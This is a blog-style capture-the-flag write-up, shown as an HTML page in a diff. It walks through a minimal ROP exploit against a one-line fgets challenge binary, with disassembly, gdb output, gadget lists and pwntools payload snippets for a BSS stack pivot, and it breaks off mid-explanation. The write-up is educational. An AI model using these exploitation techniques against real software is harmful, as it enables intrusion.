@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+
+  <script type="text/javascript" id="MathJax-script" async
+    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+  </script>
+<script type="text/javascript">
+window.MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']],
+    displayMath: [['$$', '$$'], ['\\[', '\\]']]
+  },
+  chtml: {
+    scale: 1.10   /* Increase font size: 1.0 = default, 1.5 = 150% */
+  }
+};
+</script>
+  <title>grey/overly simplified pwn challenge</title><!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="grey/overly simplified pwn challenge" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="recommended listening fill in the blank by car seat headrest" />
+<meta property="og:description" content="recommended listening fill in the blank by car seat headrest" />
+<link rel="canonical" href="http://localhost:4000/2026/04/01/i-hate-ret2dlresolve.html" />
+<meta property="og:url" content="http://localhost:4000/2026/04/01/i-hate-ret2dlresolve.html" />
+<meta property="og:site_name" content="wrenches" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-04-01T05:40:00+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="grey/overly simplified pwn challenge" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-04-01T05:40:00+08:00","datePublished":"2026-04-01T05:40:00+08:00","description":"recommended listening fill in the blank by car seat headrest","headline":"grey/overly simplified pwn challenge","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2026/04/01/i-hate-ret2dlresolve.html"},"url":"http://localhost:4000/2026/04/01/i-hate-ret2dlresolve.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="wrenches" /><link rel="shortcut icon" type="image/x-icon" href="" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+
+</head>
+<body a="dark">
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <a href="/"></a><article>
+  <p class="post-meta">
+    <time datetime="2026-04-01 05:40:00 +0800">2026-04-01 05:40:00 +0800</time>
+  </p>
+  
+  <h1>grey/overly simplified pwn challenge</h1>
+
+  <p><a href="https://www.youtube.com/watch?v=s_a1hPwXiWw">recommended listening fill in the blank by car seat headrest</a>
+<img src="https://i.imgur.com/cwdsObm.png" alt="img" /></p>
+
+<blockquote>
+  <p>pwn/overly simplified pwn challenge</p>
+
+  <p>author: elma</p>
+
+  <p>solves: 2</p>
+</blockquote>
+
+<p>guy who said he was gonna retire: ermmm let’s upsolve some pwn</p>
+
+<p>this is an old pwn challenge from grey24 (before i properly started ctf as a whole), here is my upsolve. i was drawn to this challenge because the intended solution is <code class="language-plaintext highlighter-rouge">ret2dlresolve</code>, a technique which i have never learned how to do and never will because i think it is inelegant and cringe. i wanted to see if it was possible to solve it without <code class="language-plaintext highlighter-rouge">ret2dlresolve</code>, and after 8 hours of suffering (1am - 5am, then woke up at 2pm and finished it) i managed to get a working solve on remote.</p>
+
+<p>honestly i did not enjoy solving this challenge because i spent around 6 of those hours trying to coerce <code class="language-plaintext highlighter-rouge">one_gadget</code> constraints through various, increasingly psychotic methods which did not pan out, but that is a me problem! i think the challenge is really cool and forces you to <em>really</em> squeeze water out a stone. one particular technique here i’d never used before and found fascinating (despite how finicky it was x_x)</p>
+
+<p>the challenge is two lines of C code:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span><span class="k">return</span> <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);}</span>
+</code></pre></div></div>
+
+<p>for these minimal ROP challenges, you are essentially forced to stare at the assembly - here is the disassembly for this <code class="language-plaintext highlighter-rouge">main()</code> function, we can see the stack allocations, the <code class="language-plaintext highlighter-rouge">fgets</code> call, and the <code class="language-plaintext highlighter-rouge">leave ; ret</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">0000000000401136</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;</span><span class="p">:</span>
+  <span class="mi">401136</span><span class="p">:</span>	<span class="n">f3</span> <span class="mi">0</span><span class="n">f</span> <span class="mi">1</span><span class="n">e</span> <span class="n">fa</span>          	<span class="n">endbr64</span>
+  <span class="mi">40113</span><span class="n">a</span><span class="p">:</span>	<span class="mi">55</span>                   	<span class="n">push</span>   <span class="n">rbp</span>
+  <span class="mi">40113</span><span class="n">b</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">89</span> <span class="n">e5</span>             	<span class="n">mov</span>    <span class="n">rbp</span><span class="p">,</span><span class="n">rsp</span>
+  <span class="mi">40113</span><span class="n">e</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">83</span> <span class="n">ec</span> <span class="mi">10</span>          	<span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x10</span>
+  <span class="mi">401142</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">15</span> <span class="n">e7</span> <span class="mi">2</span><span class="n">e</span> <span class="mi">00</span> <span class="mi">00</span> 	<span class="n">mov</span>    <span class="n">rdx</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x2ee7</span><span class="p">]</span>        <span class="c1"># 404030 &lt;stdin@GLIBC_2.2.5&gt;
+</span>  <span class="mi">401149</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">8</span><span class="n">d</span> <span class="mi">45</span> <span class="n">ff</span>          	<span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x1</span><span class="p">]</span>
+  <span class="mi">40114</span><span class="n">d</span><span class="p">:</span>	<span class="n">be</span> <span class="mi">80</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="n">mov</span>    <span class="n">esi</span><span class="p">,</span><span class="mh">0x80</span>
+  <span class="mi">401152</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">89</span> <span class="n">c7</span>             	<span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
+  <span class="mi">401155</span><span class="p">:</span>	<span class="n">e8</span> <span class="n">e6</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       	<span class="n">call</span>   <span class="mi">401040</span> <span class="o">&lt;</span><span class="n">fgets</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+  <span class="mi">40115</span><span class="n">a</span><span class="p">:</span>	<span class="n">c9</span>                   	<span class="n">leave</span>
+  <span class="mi">40115</span><span class="n">b</span><span class="p">:</span>	<span class="n">c3</span>                   	<span class="n">ret</span>
+</code></pre></div></div>
+
+<p>the challenge is no PIE (important) and partial RELRO (important if you’re solving with ret2dlresolve, but not important at all for our concerns). given the barebones nature of the code, the gadgets are also <em>very</em> barebones: we have almost no direct register control aside from <code class="language-plaintext highlighter-rouge">rsp</code> (via <code class="language-plaintext highlighter-rouge">leave ; ret</code>) and <code class="language-plaintext highlighter-rouge">rbp</code>. what do we do?</p>
+
+<p>first we’ll need to know where things are, so we stack pivot into BSS (fairly standard). in this binary, BSS is located at <code class="language-plaintext highlighter-rouge">0x404400</code>, so we pivot out by overwriting <code class="language-plaintext highlighter-rouge">rbp</code> into a BSS address and overwriting <code class="language-plaintext highlighter-rouge">rsp</code> to the <em>middle</em> of the <code class="language-plaintext highlighter-rouge">main</code> function, before the stack prologue.</p>
+
+<p>the stack frame looks something like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x00 &lt;- single byte buf
+0xcafebeefdeadbabe &lt;- stored RBP
+0xdeedfeedcacababa &lt;- retaddr
+0x... &lt;- a further 0x6f bytes of buffer
+</code></pre></div></div>
+
+<p>note that because there is only a single byte of buffer, basically the first <code class="language-plaintext highlighter-rouge">0x10</code> bytes of our write will have to be “clobbered” with an <code class="language-plaintext highlighter-rouge">RBP</code> pointer and a valid <code class="language-plaintext highlighter-rouge">retaddr</code>. this is Annoyance Number One. Annoyance Number Two is the use of <code class="language-plaintext highlighter-rouge">fgets</code>, which terminates on a newline (if you ever have an <code class="language-plaintext highlighter-rouge">0xa</code> byte in your payload, fgets will interpret it as a newline and terminate your read xd), as well as nullterminating every single write. the nullterminator here is <em>especially</em> annoying! but alas, we must work our way around it.</p>
+
+<p>but okay, we can pivot out and get our bearings (and a consistent location for our writes that we can reference). what now?</p>
+
+<h3 id="the-profundity">the profundity</h3>
+
+<p><code class="language-plaintext highlighter-rouge">fgets</code>, despite its many annoyances, ends up being our saviour here. the execution of <code class="language-plaintext highlighter-rouge">fgets</code> ends up calling multiple different libc helper functions - the important thing here is that with function calls come new stack frames, and with new stack frames comes <em>new values written to the stack</em>, such as return addresses, stored temporary variables, callee-saved registers etc. to illustrate, let’s look at the stack trace in the middle of an <code class="language-plaintext highlighter-rouge">fgets</code> call:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">------------------------------------------------------------------</span> <span class="n">trace</span> <span class="o">----</span>
+<span class="p">[</span><span class="o">*</span><span class="err">#</span><span class="mi">0</span><span class="p">]</span> <span class="mh">0x7f787a45641c</span> <span class="o">&lt;</span><span class="n">_IO_getline_info</span><span class="o">+</span><span class="mh">0xac</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">frame</span> <span class="n">name</span><span class="o">:</span> <span class="n">__GI__IO_getline_info</span><span class="p">)</span>
+<span class="p">[</span> <span class="err">#</span><span class="mi">1</span><span class="p">]</span> <span class="mh">0x7f787a45651c</span> <span class="o">&lt;</span><span class="n">NO_SYMBOL</span><span class="o">&gt;</span>
+<span class="p">[</span> <span class="err">#</span><span class="mi">2</span><span class="p">]</span> <span class="mh">0x7f787a455410</span> <span class="o">&lt;</span><span class="n">fgets</span><span class="o">+</span><span class="mh">0x90</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">frame</span> <span class="n">name</span><span class="o">:</span> <span class="n">_IO_fgets</span><span class="p">)</span>
+<span class="p">[</span> <span class="err">#</span><span class="mi">3</span><span class="p">]</span> <span class="mh">0x00000040115a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mh">0x24</span><span class="o">&gt;</span>
+<span class="p">[</span> <span class="err">#</span><span class="mi">4</span><span class="p">]</span> <span class="mh">0x7f787a3ffd90</span> <span class="o">&lt;</span><span class="n">__libc_start_call_main</span><span class="o">+</span><span class="mh">0x80</span><span class="o">&gt;</span>
+<span class="p">[</span> <span class="err">#</span><span class="mi">5</span><span class="p">]</span> <span class="mh">0x7f787a3ffe40</span> <span class="o">&lt;</span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mh">0x80</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">frame</span> <span class="n">name</span><span class="o">:</span> <span class="n">__libc_start_main_impl</span><span class="p">)</span>
+<span class="p">[</span> <span class="err">#</span><span class="mi">6</span><span class="p">]</span> <span class="mh">0x000000401075</span> <span class="o">&lt;</span><span class="n">_start</span><span class="o">+</span><span class="mh">0x25</span><span class="o">&gt;</span>
+<span class="o">-----------------------------------------------------------------------------</span>
+<span class="n">gef</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>we can see that <code class="language-plaintext highlighter-rouge">fgets</code> calls <code class="language-plaintext highlighter-rouge">_IO_getline_info</code>. naturally, it would need to push the return address (<code class="language-plaintext highlighter-rouge">fgets+0x90</code>) to the stack, and since our stack is in BSS, that means <em>we would have valid libc pointers</em> sprayed onto the BSS. this will essentially function as our ‘leak’ (in these minimal ROP challenges it’s honestly a bit foolish to expect you get any ‘proper’ leaks).</p>
+
+<p>seasoned pwn players will understand what you can do with these libc addrs: add gadgets!</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x000000000040111c</span> <span class="o">:</span> <span class="n">add</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">-</span> <span class="mh">0x3d</span><span class="p">],</span> <span class="n">ebx</span> <span class="p">;</span> <span class="n">nop</span> <span class="p">;</span> <span class="n">ret</span>
+</code></pre></div></div>
+
+<p>note this gadget, which adds a 32-bit value stored in <code class="language-plaintext highlighter-rouge">ebx</code> to a memory address stored in <code class="language-plaintext highlighter-rouge">rbp - 0x3d</code>. with both <code class="language-plaintext highlighter-rouge">rbp</code> and <code class="language-plaintext highlighter-rouge">ebx</code> control, we can arbitrarily add or subtract from values stored in a writable region of memory. so, theoretically, we could spray libc ptrs using an fgets call, and <em>then</em> add a value to it to point to something useful (like a one gadget).</p>
+
+<p>now, the issue: we don’t have <code class="language-plaintext highlighter-rouge">ebx</code> control. we have trivial <code class="language-plaintext highlighter-rouge">rbp</code> control, sure, but nothing gives us control of <code class="language-plaintext highlighter-rouge">ebx</code>. no gadgets in the binary, not even any function calls that affect <code class="language-plaintext highlighter-rouge">ebx</code>. what is the plan now?</p>
+
+<p>this part took quite a bit of thinking. we may want to SROP, but we have no syscalls anywhere in the binary, and we don’t have <code class="language-plaintext highlighter-rouge">rax</code> control anyway. and i am purposefully eschewing <code class="language-plaintext highlighter-rouge">ret2dlresolve</code> here. the answer, once again, comes in the form of the addresses sprayed by <code class="language-plaintext highlighter-rouge">fgets</code>!</p>
+
+<h3 id="examining-the-addresses">examining the addresses</h3>
+
+<p>what i did at this stage in the challenge is just spam random calls to <code class="language-plaintext highlighter-rouge">fgets</code> (we return to the middle of the <code class="language-plaintext highlighter-rouge">main()</code> function by overwriting the retaddr but don’t do anything else otherwise):</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="n">b</span><span class="sc">'\x00'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404990</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">WRITE</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">b</span><span class="sc">'\x00'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404500</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">WRITE</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">b</span><span class="sc">'\x00'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404da0</span><span class="p">)</span> <span class="err">#</span> <span class="n">next</span> <span class="n">rbp</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">WRITE</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>afterwards i just eyepowered the <code class="language-plaintext highlighter-rouge">bss</code> region for interesting pointers, <code class="language-plaintext highlighter-rouge">bata24</code>’s <code class="language-plaintext highlighter-rouge">gef</code> makes this easy:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Searching</span> <span class="k">for</span> <span class="n">addresses</span> <span class="n">in</span> <span class="err">'</span><span class="n">challenge</span><span class="err">'</span> <span class="n">that</span> <span class="n">point</span> <span class="n">to</span> <span class="err">'</span><span class="n">libc</span><span class="err">'</span>
+<span class="n">challenge</span><span class="o">:</span> <span class="mh">0x0000000000403ff0</span>  <span class="o">-&gt;</span>  <span class="mh">0x00007f7fc2f34dc0</span> <span class="o">&lt;</span><span class="n">__libc_start_main</span><span class="o">&gt;</span>  <span class="o">-&gt;</span>  <span class="mh">0x89495741fa1e0ff3</span>
+<span class="n">challenge</span><span class="o">:</span> <span class="mh">0x0000000000404018</span> <span class="o">&lt;</span><span class="n">fgets</span><span class="err">@</span><span class="n">got</span><span class="p">[</span><span class="n">plt</span><span class="p">]</span><span class="o">&gt;</span>  <span class="o">-&gt;</span>  <span class="mh">0x00007f7fc2f8a380</span> <span class="o">&lt;</span><span class="n">fgets</span><span class="o">&gt;</span>  <span class="o">-&gt;</span>  <span class="mh">0x55415641fa1e0ff3</span>
+<span class="n">challenge</span><span class="o">:</span> <span class="mh">0x0000000000404030</span> <span class="o">&lt;</span><span class="n">stdin</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">5</span><span class="o">&gt;</span>  <span class="o">-&gt;</span>  <span class="mh">0x00007f7fc3125aa0</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stdin_</span><span class="o">&gt;</span>  <span class="o">-&gt;</span>  <span class="mh">0x00000000fbad2088</span>
+<span class="n">challenge</span><span class="o">:</span> <span class="mh">0x0000000000404908</span>  <span class="o">-&gt;</span>  <span class="mh">0x00007f7fc2f8b494</span> <span class="o">&lt;</span><span class="n">_IO_getline_info</span><span class="o">+</span><span class="mh">0x124</span><span class="o">&gt;</span>  <span class="o">-&gt;</span>  <span class="mh">0x448d4808244c8b48</span>
+<span class="n">challenge</span><span class="o">:</span> <span class="mh">0x0000000000404940</span>  <span class="o">-&gt;</span>  <span class="mh">0x00007f7fc3125aa0</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stdin_</span><span class="o">&gt;</span>  <span class="o">-&gt;</span>  <span class="mh">0x00000000fbad2088</span>
+<span class="n">challenge</span><span class="o">:</span> <span class="mh">0x0000000000404968</span>  <span class="o">-&gt;</span>  <span class="mh">0x00007f7fc2f8a410</span> <span class="o">&lt;</span><span class="n">fgets</span><span class="o">+</span><span class="mh">0x90</span><span class="o">&gt;</span>  <span class="o">-&gt;</span>  <span class="mh">0x8548f6314500558b</span>
+<span class="n">challenge</span><span class="o">:</span> <span class="mh">0x0000000000404d60</span>  <span class="o">-&gt;</span>  <span class="mh">0x00007f7fc2f8b494</span> <span class="o">&lt;</span><span class="n">_IO_getline_info</span><span class="o">+</span><span class="mh">0x124</span><span class="o">&gt;</span>  <span class="o">-&gt;</span>  <span class="mh">0x448d4808244c8b48</span>
+<span class="n">challenge</span><span class="o">:</span> <span class="mh">0x0000000000404d80</span>  <span class="o">-&gt;</span>  <span class="mh">0x00007f7fc2f8b494</span> <span class="o">&lt;</span><span class="n">_IO_getline_info</span><span class="o">+</span><span class="mh">0x124</span><span class="o">&gt;</span>  <span class="o">-&gt;</span>  <span class="mh">0x448d4808244c8b48</span>
+<span class="n">challenge</span><span class="o">:</span> <span class="mh">0x0000000000404db8</span>  <span class="o">-&gt;</span>  <span class="mh">0x00007f7fc3125aa0</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stdin_</span><span class="o">&gt;</span>  <span class="o">-&gt;</span>  <span class="mh">0x00000000fbad2088</span>
+<span class="n">challenge</span><span class="o">:</span> <span class="mh">0x0000000000404de0</span>  <span class="o">-&gt;</span>  <span class="mh">0x00007f7fc2f8a410</span> <span class="o">&lt;</span><span class="n">fgets</span><span class="o">+</span><span class="mh">0x90</span><span class="o">&gt;</span>  <span class="o">-&gt;</span>  <span class="mh">0x8548f6314500558b</span>
+<span class="n">gef</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>we can see cool stuff here - there’s pointers to <code class="language-plaintext highlighter-rouge">stdin</code>, but more importantly, this <code class="language-plaintext highlighter-rouge">_IO_getline_info+0x124</code> function. we can disassemble the instructions pointed to by that function, and see:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">16</span><span class="n">i</span> <span class="mh">0x00007f7fc2f8b494</span>
+   <span class="mh">0x7f7fc2f8b494</span> <span class="o">&lt;</span><span class="n">__GI__IO_getline_info</span><span class="o">+</span><span class="mi">292</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rcx</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
+   <span class="mh">0x7f7fc2f8b499</span> <span class="o">&lt;</span><span class="n">__GI__IO_getline_info</span><span class="o">+</span><span class="mi">297</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rbp</span><span class="o">+</span><span class="n">rbx</span><span class="o">*</span><span class="mi">1</span><span class="o">+</span><span class="mh">0x0</span><span class="p">]</span>
+   <span class="mh">0x7f7fc2f8b49e</span> <span class="o">&lt;</span><span class="n">__GI__IO_getline_info</span><span class="o">+</span><span class="mi">302</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">r12</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="n">rcx</span>
+   <span class="mh">0x7f7fc2f8b4a3</span> <span class="o">&lt;</span><span class="n">__GI__IO_getline_info</span><span class="o">+</span><span class="mi">307</span><span class="o">&gt;:</span>	<span class="n">add</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x28</span>
+   <span class="mh">0x7f7fc2f8b4a7</span> <span class="o">&lt;</span><span class="n">__GI__IO_getline_info</span><span class="o">+</span><span class="mi">311</span><span class="o">&gt;:</span>	<span class="n">pop</span>    <span class="n">rbx</span>
+   <span class="mh">0x7f7fc2f8b4a8</span> <span class="o">&lt;</span><span class="n">__GI__IO_getline_info</span><span class="o">+</span><span class="mi">312</span><span class="o">&gt;:</span>	<span class="n">pop</span>    <span class="n">rbp</span>
+   <span class="mh">0x7f7fc2f8b4a9</span> <span class="o">&lt;</span><span class="n">__GI__IO_getline_info</span><span class="o">+</span><span class="mi">313</span><span class="o">&gt;:</span>	<span class="n">pop</span>    <span class="n">r12</span>
+   <span class="mh">0x7f7fc2f8b4ab</span> <span class="o">&lt;</span><span class="n">__GI__IO_getline_info</span><span class="o">+</span><span class="mi">315</span><span class="o">&gt;:</span>	<span class="n">pop</span>    <span class="n">r13</span>
+   <span class="mh">0x7f7fc2f8b4ad</span> <span class="o">&lt;</span><span class="n">__GI__IO_getline_info</span><span class="o">+</span><span class="mi">317</span><span class="o">&gt;:</span>	<span class="n">pop</span>    <span class="n">r14</span>
+   <span class="mh">0x7f7fc2f8b4af</span> <span class="o">&lt;</span><span class="n">__GI__IO_getline_info</span><span class="o">+</span><span class="mi">319</span><span class="o">&gt;:</span>	<span class="n">pop</span>    <span class="n">r15</span>
+   <span class="mh">0x7f7fc2f8b4b1</span> <span class="o">&lt;</span><span class="n">__GI__IO_getline_info</span><span class="o">+</span><span class="mi">321</span><span class="o">&gt;:</span>	<span class="n">ret</span>
+</code></pre></div></div>
+
+<p>whoa! this is <code class="language-plaintext highlighter-rouge">rbx</code>, <code class="language-plaintext highlighter-rouge">rbp</code> as well as <code class="language-plaintext highlighter-rouge">r12-15</code> control?? for free!</p>
+
+<h3 id="a-quick-aside">a quick aside</h3>
+
+<p>this gadget is also actually <code class="language-plaintext highlighter-rouge">rcx</code> control by way of <code class="language-plaintext highlighter-rouge">mov rcx, QWORD PTR [rsp+0x8]</code> - this is something i only realised now while writing this xd. for around an hour during this challenge, i wanted to do something with the following gadgets:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">base</span><span class="p">)</span> <span class="n">wrenches</span><span class="err">@</span><span class="n">kitty</span> <span class="p">(</span><span class="n">ork</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">overly</span><span class="o">-</span><span class="n">simplified</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">ROPgadget</span> <span class="o">--</span><span class="n">binary</span><span class="o">=</span><span class="n">main</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">cx</span> 
+<span class="mh">0x000000000040111b</span> <span class="o">:</span> <span class="n">add</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rcx</span><span class="p">],</span> <span class="n">al</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rbp</span> <span class="p">;</span> <span class="n">ret</span>
+<span class="mh">0x0000000000401159</span> <span class="o">:</span> <span class="n">dec</span> <span class="n">ecx</span> <span class="p">;</span> <span class="n">ret</span>
+</code></pre></div></div>
+
+<p>we technically <em>do</em> have limited <code class="language-plaintext highlighter-rouge">rcx</code> control by way of <code class="language-plaintext highlighter-rouge">fgets</code>, which stores a ptr to the last byte of buffer written in both <code class="language-plaintext highlighter-rouge">rax</code> and <code class="language-plaintext highlighter-rouge">rcx</code>. my initial idea was to leverage this control by writing just a <em>bit</em> below a libc addr we wanted to modify, chaining <code class="language-plaintext highlighter-rouge">dec ecx</code> to decrement it to point to the libc addr itself, and then calling the <code class="language-plaintext highlighter-rouge">add byte ptr</code> gadget. i have actually been able to use this <code class="language-plaintext highlighter-rouge">add byte ptr</code> gadget before, although not in such a roundabout way.</p>
+
+<p>at some point doing these challenges you kind of get so fucking lost in the sauce trying to construct these absurd situations that you often forget a far easier way to go about things. i’m not even going to say that this <code class="language-plaintext highlighter-rouge">IO_getline_info</code> gadget is <em>at all</em> straightforward to think of using, but it’s a lot simpler to actually use. note that because the <em>same</em> value is in <code class="language-plaintext highlighter-rouge">rcx</code> and <code class="language-plaintext highlighter-rouge">rax</code>, and you are using the (least-significant byte) value of <code class="language-plaintext highlighter-rouge">rax</code> to add to the value pointed at by <code class="language-plaintext highlighter-rouge">ecx</code>, you would need to <em>very specifically</em> control where you even put what you want to modify! that’s not really something we can do with any sort of finesse given we’re just spraying the gadgets at random.</p>
+
+<p>but yeah holy shit it’s just crazy what your brain can come up with at 3am. it certainly Is possible to get this to work (believe me i got like 70% of the way there!). in some sense this is like impressionism, or pointillism, or rather the opposite - you get so caught up in the tiny details of execution, these small little dots of the canvas, that you forget about the actual end goal.</p>
+
+<p>what im trying to say is that im basically Monet and these schizophrenic 6-eye ropfu chains are my Impression, Sunrise</p>
+
+<h3 id="back-to-it">back to it</h3>
+
+<p>going back to the gadget, let’s think about how we can even end up ropchaining to it. we can do so by exploiting our <code class="language-plaintext highlighter-rouge">rbp</code> control and <code class="language-plaintext highlighter-rouge">leave ; ret</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x000000404d70</span><span class="o">|+</span><span class="mh">0x0000</span><span class="o">|+</span><span class="mo">000</span><span class="o">:</span> <span class="mh">0x0000000012cf12c4</span> <span class="p">(</span><span class="n">we</span> <span class="err">`</span><span class="n">pop</span> <span class="n">rbp</span><span class="err">`</span> <span class="n">to</span> <span class="n">point</span> <span class="n">here</span><span class="p">,</span> <span class="n">and</span> <span class="n">then</span> <span class="n">call</span> <span class="err">`</span><span class="n">leave</span><span class="err">`</span><span class="p">)</span>
+<span class="mh">0x000000404d78</span><span class="o">|+</span><span class="mh">0x0008</span><span class="o">|+</span><span class="mo">001</span><span class="o">:</span> <span class="mh">0x0000000100000000</span> <span class="p">(</span><span class="err">`</span><span class="n">leave</span><span class="err">`</span> <span class="n">will</span> <span class="n">re</span><span class="o">-</span><span class="n">pop</span> <span class="n">the</span> <span class="n">rbp</span> <span class="n">value</span> <span class="n">here</span><span class="p">)</span>
+<span class="mh">0x000000404d80</span><span class="o">|+</span><span class="mh">0x0010</span><span class="o">|+</span><span class="mo">002</span><span class="o">:</span> <span class="mh">0x00007f7fc2f8b494</span> <span class="o">&lt;</span><span class="n">_IO_getline_info</span><span class="o">+</span><span class="mh">0x124</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">where</span> <span class="n">we</span> <span class="n">want</span> <span class="n">to</span> <span class="n">ret</span><span class="p">)</span>
+<span class="mh">0x000000404d88</span><span class="o">|+</span><span class="mh">0x0018</span><span class="o">|+</span><span class="mo">003</span><span class="o">:</span> <span class="mh">0x0000000000000000</span> <span class="o">&lt;-</span> <span class="n">the</span> <span class="n">value</span> <span class="n">of</span> <span class="n">RSP</span> <span class="n">as</span> <span class="n">we</span> <span class="n">go</span> <span class="n">through</span> <span class="n">the</span> <span class="n">gadget</span>
+</code></pre></div></div>
+
+<p>but let’s take a look at that gadget again, specifically, the <code class="language-plaintext highlighter-rouge">add rsp, 0x28</code> instruction. this means that our value for <code class="language-plaintext highlighter-rouge">rbx</code> has to be <code class="language-plaintext highlighter-rouge">0x28</code> below the value of RSP as we go through, so actually we need the layout to look more like this:</p>
+
